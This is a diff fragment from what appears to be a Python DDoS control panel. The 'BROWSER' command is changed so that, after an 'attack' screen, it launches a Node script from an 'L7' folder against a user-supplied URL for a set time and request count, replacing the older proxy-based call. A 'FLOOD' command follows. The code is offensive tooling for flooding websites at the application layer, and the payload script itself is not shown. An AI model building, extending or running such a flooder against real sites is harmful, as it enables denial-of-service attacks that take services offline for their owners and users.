@@ -504,12 +504,12 @@ def main():
                         try:
                                 url = sin.split()[1]
                                 time = sin.split()[2]
-                                threads = sin.split()[3]
+                                req = sin.split()[3]
                                 Screen.wrapper(attack)
                                 os.system ("clear")
-                                os.system(f'cd L7 && node ck-browser.js {url} {time} {threads} proxy.txt')  
+                                os.system(f'cd L7 && node BROWSER.js {url} {time} {req}')  
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mBROWSER <url> <time> <threads>")
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mBROWSER <url> <time> <requests>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mBROWSER https://example.com 120 10')
                 
                 elif sinput == "FLOOD" or sinput == "flood":
